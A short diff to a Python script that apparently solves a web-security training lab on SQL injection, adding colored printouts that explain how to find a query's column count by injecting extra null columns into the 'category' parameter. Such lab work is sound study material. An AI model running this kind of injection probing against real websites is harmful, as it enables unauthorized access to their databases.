@@ -1,5 +1,6 @@
 import requests
 import urllib3
+from colorama import Fore
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -20,6 +21,9 @@ def sqli_column_number(url, proxies):
     return False
 
 def run(url, payload=None, proxies=None):
+    print(Fore.YELLOW + f"Steps to solve the lab:")
+    print(Fore.WHITE + f"""1. Inject payload into 'category' query parameter to determine the number of columns\n2. Add one additional null column at a time\n3. Repeat this process, increasing the number of columns until you receive a valid response\n""")
+
     print("[+] Figuring out number of columns...")
     num_col = sqli_column_number(url, proxies)
     if num_col:
